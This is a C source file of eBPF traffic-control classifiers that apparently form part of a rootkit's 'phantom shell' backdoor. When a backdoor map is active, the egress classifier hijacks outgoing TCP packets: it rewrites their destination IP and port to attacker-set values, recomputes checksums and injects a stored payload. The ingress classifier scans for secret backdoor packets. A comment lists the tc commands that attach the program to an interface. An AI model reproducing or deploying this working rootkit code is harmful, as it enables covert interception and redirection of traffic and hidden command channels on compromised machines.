
#include <linux/bpf.h>
#include <linux/pkt_cls.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <arpa/inet.h>
#include <linux/swab.h>
#include <linux/types.h>
//#include <bpf/libbpf.h>
//#include <bpf/libbpf.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_helpers.h>
//#include <bpf/bpf_core_read.h>
//#include <bpf/bpf_endian.h>
//#include <bpf/bpf.h>

#define __H_TCKIT
#include "defs.h"
#include "../../../common/struct_common.h"
#include "../../../common/constants.h"

SEC("classifier/egress")
int classifier_egress(struct __sk_buff *skb){
	void *data = (void *)(__u64)skb->data;
	void *data_end = (void *)(__u64)skb->data_end;
    //bpf_printk("TC egress classifier called\n");
	
	//We are interested on parsing TCP/IP packets so let's assume we have one
	//Ethernet header
	struct ethhdr *eth = data;
	if ((void *)eth + sizeof(struct ethhdr) > data_end){
        bpf_printk("ETH\n");
		return TC_ACT_OK;
    }
	if(eth->h_proto != htons(ETH_P_IP)){
		//Not an IP packet
		bpf_printk("IP\n");
		return TC_ACT_OK;
	}

	//IP header
	struct iphdr *ip = (struct iphdr*)(data + sizeof(struct ethhdr));
	if ((void *)ip + sizeof(struct iphdr) > data_end){
		bpf_printk("IP CHECK, ip: %llx, data: %llx, datalen: %llx\n", ip, data, data_end);
        return TC_ACT_OK;
    }
	if(ip->protocol != IPPROTO_TCP){
		//bpf_printk("Not TCP\n");
		return TC_ACT_OK;
	}

	//TCP header
	struct tcphdr *tcp = (struct tcphdr *)(data + sizeof(struct ethhdr) + sizeof(struct iphdr));
	if ((void *)tcp + sizeof(struct tcphdr) > data_end){
		bpf_printk("TCP CHECK\n");
        return TC_ACT_OK;
    }

	//We must avoid tampering with packets directed to 9000, this is just
	//for testing in lo, since it makes us modify the trigger
	__u16 src_port = ntohs(tcp->source);
	if(src_port == CC_CLIENT_SECRET_COMMANDING_PORT_DEFAULT){
		bpf_printk("PORT CHECK\n");
		return TC_ACT_OK;
	}

	bpf_printk("Detected bounds: data:%llx, data_end:%llx", data, data_end);
	bpf_printk("Detected headers: \n\teth:%llx\n\tip:%llx\n\ttcp:%llx\n", eth, ip, tcp);

	__u32 payload_size = ntohs(ip->tot_len) - (tcp->doff * 4) - (ip->ihl * 4);
    bpf_printk("ip_totlen: %u, tcp_doff*4: %u, ip_ihl: %u\n", ntohs(ip->tot_len), tcp->doff*4, ip->ihl*4);
	//char* payload = (void *)(tcp + tcp->doff*4);
	char* payload = data_end - payload_size;
	/*if ((void*)payload + payload_size > data_end){
		bpf_printk("PAYLOAD CHECK, payload:%llx, payload_size:%llx, data_end:%llx\n", payload, payload_size, data_end);
        return TC_ACT_OK;
    }*/
	
	//Mark skb buffer readable and writable
	bpf_skb_pull_data(skb, 0);

	bpf_printk("PAYLOAD size: %u\n", payload_size);
	
	//We redirect whatever packet this is to the rootkit
	//The TCP retransmissions will be in charge of resending it correctly later
	__u64 key = 1;
	struct backdoor_phantom_shell_data *ps_data = (struct backdoor_phantom_shell_data*) bpf_map_lookup_elem(&backdoor_phantom_shell, &key);
    struct backdoor_phantom_shell_data ps_new_data = {0};
	if(ps_data == (void*)0){
		//Phantom shell not active
		bpf_printk("Phantom shell NOT active yet\n");
		/*int err = bpf_map_update_elem(&backdoor_phantom_shell, &key, &ps_new_data, BPF_ANY);
		if(err<0){
			bpf_printk("Fail to update map\n");
		}*/
		return TC_ACT_OK;
	}else if(ps_data->active == 0){
		bpf_printk("Phantom shell NOT active right now\n");
		return TC_ACT_OK;
	}
	//We will complete this request, so we get the backdoor in inactive state
	ps_new_data.active = 0;
	ps_new_data.d_ip = ps_data->d_ip;
	ps_new_data.d_port = ps_data->d_port;
	__builtin_memcpy(ps_new_data.payload, ps_data->payload, 64);
	//ps_new_data.payload = ps_data->payload;
	int err = bpf_map_update_elem(&backdoor_phantom_shell, &key, &ps_new_data, BPF_ANY);
	if(err<0){
		bpf_printk("Fail to update map\n");
	}
	bpf_printk("Phantom shell active now, A:%i IP:%x P:%x\n", ps_data->active, ps_data->d_ip, ps_data->d_port);
	bpf_printk("Phantom shell param payload: %s\n", ps_data->payload);
	__u32 new_ip = ps_data->d_ip;
	__u16 new_dport = ps_data->d_port;
	__u32 offset_ip_daddr = offsetof(struct iphdr, daddr)+ sizeof(struct ethhdr);
	__u32 offset_dport = offsetof(struct tcphdr, dest)+ sizeof(struct ethhdr) + sizeof(struct iphdr);
	__u32 offset_ip_checksum = offsetof(struct iphdr, check)+ sizeof(struct ethhdr);
	__u32 offset_tcp_checksum = offsetof(struct tcphdr, check)+ sizeof(struct ethhdr) +sizeof(struct iphdr);
	//bpf_printk("Payload: %s\n", payload);
	//TODO, adjust the length to the new payload. Verifier complains a lot so we will keep it like this for now
	__u32 increment_len = sizeof(char)*64;
	__u32 old_ip_daddr;
	bpf_skb_load_bytes(skb, offset_ip_daddr, &old_ip_daddr, sizeof(__u32));
	__u16 old_dport;
	bpf_skb_load_bytes(skb, offset_dport, &old_dport, sizeof(__u16));
	bpf_printk("offset ip: %u\n", offset_ip_daddr);
	int ret = bpf_l3_csum_replace(skb, offset_ip_checksum, old_ip_daddr, new_ip, sizeof(__u32));
	if (ret < 0) {
		bpf_printk("Failed to recompute l3 checksum: %d\n", ret);
		return TC_ACT_OK;
	}
	ret = bpf_skb_store_bytes(skb, offset_ip_daddr, &new_ip, sizeof(__u32), 0);
	if (ret < 0) {
		bpf_printk("Failed to overwrite destination ip: %d\n", ret);
		return TC_ACT_OK;
	}
	
	bpf_printk("offset port: %u\n", offset_dport);
	ret = bpf_l4_csum_replace(skb, offset_tcp_checksum, old_dport, new_dport, sizeof(__u16));
	if (ret < 0) {
		bpf_printk("Failed to recompute l4 checksum: %d\n", ret);
		return TC_ACT_OK;
	}
	ret = bpf_skb_store_bytes(skb, offset_dport, &new_dport, sizeof(__u16), 0);
	if (ret < 0) {
		bpf_printk("Failed to overwrite destination port: %d\n", ret);
		return TC_ACT_OK;
	}

	ret = bpf_skb_change_tail(skb, skb->len+increment_len, 0);
	if (ret < 0) {
		bpf_printk("Failed to enlarge the packet (via tail): %d\n", ret);
		return TC_ACT_OK;
	}
	ret = bpf_skb_pull_data(skb, 0);
	if(ret<0){
		bpf_printk("Failed to pull data\n");
	}

	//After changing the packet bounds, all the boundaries must be check again
	data = (void *)(__u64)skb->data;
	data_end = (void *)(__u64)skb->data_end;
	
	eth = data;
	if ((void *)eth + sizeof(struct ethhdr) > data_end){
        bpf_printk("ETH\n");
		return TC_ACT_OK;
    }
	ip = (struct iphdr*)(data + sizeof(struct ethhdr));
	if ((void *)ip + sizeof(struct iphdr) > data_end){
		bpf_printk("IP CHECK, ip: %llx, data: %llx, datalen: %llx\n", ip, data, data_end);
        return TC_ACT_OK;
    }
	tcp = (struct tcphdr *)(data + sizeof(struct ethhdr) + sizeof(struct iphdr));
	if ((void *)tcp + sizeof(struct tcphdr) > data_end){
		bpf_printk("TCP CHECK\n");
        return TC_ACT_OK;
	}
	if(eth == (void*)0 || tcp == (void*)0 || ip == (void*)0){
		return TC_ACT_OK;
	}
	payload_size = ntohs(ip->tot_len) - (tcp->doff * 4) - (ip->ihl * 4);
	payload = data_end - payload_size;
	if(payload_size>=sizeof(char)*64){
		return TC_ACT_OK;
	}
	if(data>data_end){
		return TC_ACT_OK;
	}
	
	__u32 offset = skb->len-payload_size-increment_len;
	if(ps_data==(void*)0){
		return TC_ACT_OK;
	}
	if(increment_len>skb->data_end-skb->data){
		return TC_ACT_OK;
	}
	if(skb->data_end < skb->data + increment_len){
		return TC_ACT_OK;
	}

	//Simple strlen
	__u32 payload_char_len = 0;
	for(int ii=0; ii<64; ii++){
		if(ps_data->payload[ii]!='\0'){
			payload_char_len++;
		}else{
			break;
		}
	}
	if(payload_char_len>=increment_len|| payload_char_len<=0){
		return TC_ACT_OK;
	}

	bpf_printk("New payload offset %i, writing %i bytes\n", offset, payload_char_len);
	ret = bpf_skb_store_bytes(skb, offset, ps_data->payload, payload_char_len, 0);
	if (ret < 0) {
		bpf_printk("Failed to overwrite payload: %d\n", ret);
		return TC_ACT_OK;
	}

	data = (void *)(__u64)skb->data;
	data_end = (void *)(__u64)skb->data_end;
	
	eth = data;
	if ((void *)eth + sizeof(struct ethhdr) > data_end){
        bpf_printk("ETH\n");
		return TC_ACT_OK;
    }
	ip = (struct iphdr*)(data + sizeof(struct ethhdr));
	if ((void *)ip + sizeof(struct iphdr) > data_end){
		bpf_printk("IP CHECK, ip: %llx, data: %llx, datalen: %llx\n", ip, data, data_end);
        return TC_ACT_OK;
    }
	tcp = (struct tcphdr *)(data + sizeof(struct ethhdr) + sizeof(struct iphdr));
	if ((void *)tcp + sizeof(struct tcphdr) > data_end){
		bpf_printk("TCP CHECK\n");
        return TC_ACT_OK;
	}

	//Fixing IP checksum
	//bpf_printk("Old value %x, new value %x\n", htons(ip->tot_len), htons(ntohs(ip->tot_len)+increment_len));
	__u32 offset_ip_tot_len = offsetof(struct iphdr, tot_len)+ sizeof(struct ethhdr);
	__u16 new_tot_len = htons(ntohs(ip->tot_len)+increment_len);
	ret = bpf_l3_csum_replace(skb, offset_ip_checksum, (ip->tot_len), new_tot_len, sizeof(__u16));
	if (ret < 0) {
		bpf_printk("Failed to recompute l3 checksum: %d\n", ret);
		return TC_ACT_OK;
	}
	bpf_printk("New ip tot len: %i\n", ntohs(new_tot_len));
	ret = bpf_skb_store_bytes(skb, offset_ip_tot_len, &new_tot_len, sizeof(__u16), 0);
	if (ret < 0) {
		bpf_printk("Failed to overwrite ip total len: %d\n", ret);
		return TC_ACT_OK;
	}

	bpf_printk("Finished packet hijacking routine\n");

	return TC_ACT_OK;
	
}

SEC("classifier/ingress")
int classifier_ingress(struct __sk_buff *skb){
	void *data = (void *)(__u64)skb->data;
	void *data_end = (void *)(__u64)skb->data_end;
    bpf_printk("TC ingress classifier called\n");
	
	//We are interested on parsing TCP/IP packets so let's assume we have one
	//Ethernet header
	struct ethhdr *eth = data;
	if ((void *)eth + sizeof(struct ethhdr) > data_end){
        bpf_printk("ETH\n");
		return TC_ACT_OK;
    }
	if(eth->h_proto != htons(ETH_P_IP)){
		//Not an IP packet
		bpf_printk("IP\n");
		return TC_ACT_OK;
	}

	//IP header
	struct iphdr *ip = (struct iphdr*)(data + sizeof(struct ethhdr));
	if ((void *)ip + sizeof(struct iphdr) > data_end){
		bpf_printk("IP CHECK, ip: %llx, data: %llx, datalen: %llx\n", ip, data, data_end);
        return TC_ACT_OK;
    }
	if(ip->protocol != IPPROTO_TCP){
		bpf_printk("TCP\n");
		return TC_ACT_OK;
	}

	//TCP header
	struct tcphdr *tcp = (struct tcphdr *)(data + sizeof(struct ethhdr) + sizeof(struct iphdr));
	if ((void *)tcp + sizeof(struct tcphdr) > data_end){
		bpf_printk("TCP CHECK\n");
        return TC_ACT_OK;
    }

	//We now proceed to scan for our backdoor packets
	__u16 dest_port = ntohs(tcp->dest);
	if(dest_port != SECRET_PACKET_DEST_PORT){
		bpf_printk("PORT CHECK: %u\n", dest_port);
		//return TC_ACT_OK;
	}

	bpf_printk("Detected bounds: data:%llx, data_end:%llx", data, data_end);
	bpf_printk("Detected headers: \n\teth:%llx\n\tip:%llx\n\ttcp:%llx\n", eth, ip, tcp);

	
	__u32 payload_size = ntohs(ip->tot_len) - (tcp->doff * 4) - (ip->ihl * 4);
    bpf_printk("ip_totlen: %u, tcp_doff*4: %u, ip_ihl: %u\n", ntohs(ip->tot_len), tcp->doff*4, ip->ihl*4);
	char* payload = (void *)(tcp + tcp->doff*4);
	if ((void*)payload + payload_size > data_end){
		bpf_printk("PAYLOAD CHECK, payload:%llx, payload_size:%llx, data_end:%llx\n", payload, payload_size, data_end);
        return TC_ACT_OK;
    }
	//Mark skb buffer readable and writable
	bpf_skb_pull_data(skb, 0);

	bpf_printk("PAYLOAD size: %u\n", payload_size);
	
	//We redirect whatever packet this is to the rootkit
	//The TCP retransmissions will be in charge of resending it correctly later
	/*__u64 key = 1;
	struct backdoor_phantom_shell_data *ps_data = (struct backdoor_phantom_shell_data*) bpf_map_lookup_elem(&backdoor_phantom_shell, &key);
    struct backdoor_phantom_shell_data ps_new_data = {0};
	if(ps_data == (void*)0){
		//Phantom shell not active
		bpf_printk("Phantom shell NOT active anytime\n");
		ps_new_data.active = 4;
		ps_new_data.d_ip = 1;
		ps_new_data.d_port = 1;
		int err = bpf_map_update_elem(&backdoor_phantom_shell, &key, &ps_new_data, BPF_ANY);
		if(err<0){
			bpf_printk("Fail to update map\n");
		}
		return TC_ACT_OK;
	}
	if(ps_data->active == 0){
		bpf_printk("Phantom shell NOT active now\n");
		ps_new_data.active = 5;
		ps_new_data.d_ip = 1;
		ps_new_data.d_port = 1;
		int err = bpf_map_update_elem(&backdoor_phantom_shell, &key, &ps_new_data, BPF_ANY);
		if(err<0){
			bpf_printk("Fail to update map\n");
		}
		return TC_ACT_OK;
	}
	ps_new_data.active = 6;
	ps_new_data.d_ip = 1;
	ps_new_data.d_port = 1;
	int err = bpf_map_update_elem(&backdoor_phantom_shell, &key, &ps_new_data, BPF_ANY);
	if(err<0){
		bpf_printk("Fail to update map\n");
	}
	
	bpf_printk("Phantom shell active now: active is %i\n", ps_data->active);
	__u32 new_ip = ps_data->d_ip;
	__u16 new_port = ps_data->d_port;
	__u32 offset_ip = offsetof(struct iphdr, daddr)+ sizeof(struct ethhdr);
	__u16 offset_port = offsetof(struct tcphdr, dest)+ sizeof(struct ethhdr) + sizeof(struct iphdr);
	bpf_printk("offset ip: %u\n", offset_ip);
	int ret = bpf_skb_store_bytes(skb, offset_ip, &new_ip, sizeof(__u32), BPF_F_RECOMPUTE_CSUM);
	if (ret < 0) {
		bpf_printk("Failed to overwrite destination ip: %d\n", ret);
		return TC_ACT_OK;
	}
	bpf_printk("offset port: %u\n", offset_port);
	ret = bpf_skb_store_bytes(skb, offset_port, &new_port, sizeof(__u16), BPF_F_RECOMPUTE_CSUM);
	if (ret < 0) {
		bpf_printk("Failed to overwrite destination port: %d\n", ret);
		return TC_ACT_OK;
	}*/

	return TC_ACT_OK;
	
}
/**
 * COMMANDS
 * sudo tc qdisc add dev lo clsact
 * sudo tc filter add dev lo egress bpf direct-action obj tc.o sec classifier/egress
 * sudo tc filter show dev lo
 * sudo tc filter show dev lo egress
 * 
 * sudo tc qdisc del dev lo clsact
 */



char _license[4] SEC("license") = "GPL";